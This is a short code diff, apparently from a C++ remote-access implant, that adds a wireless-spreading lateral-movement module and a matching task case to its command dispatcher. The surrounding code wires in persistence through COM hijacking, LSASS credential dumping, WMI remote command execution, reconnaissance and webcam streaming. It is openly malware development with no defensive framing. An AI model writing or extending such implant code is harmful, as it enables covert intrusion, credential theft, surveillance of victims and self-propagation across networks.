@@ -16,6 +16,7 @@
 #include "../persistence/ComHijacker.h"
 #include "../credential/LsassDumper.h"
 #include "../lateral/WmiExec.h"
+#include "../lateral/WirelessSpread.h"
 #include "../fs/FileSystem.h"
 #include "../recon/DeepRecon.h"
 #include "../crypto/Base64.h"
@@ -125,6 +126,10 @@ void TaskDispatcher::dispatch(const Task& task) {
                 std::getline(iss, rcmd); // rest as command
 
                 result.output = "LATERAL_RCE:" + lateral::WmiExec(target, user, pass, rcmd);
+                break;
+            }
+            case TaskType::LATERAL_WIRELESS: {
+                result.output = lateral::SpreadWireless(task.cmd);
                 break;
             }
             case TaskType::WEBCAM_STREAM: {
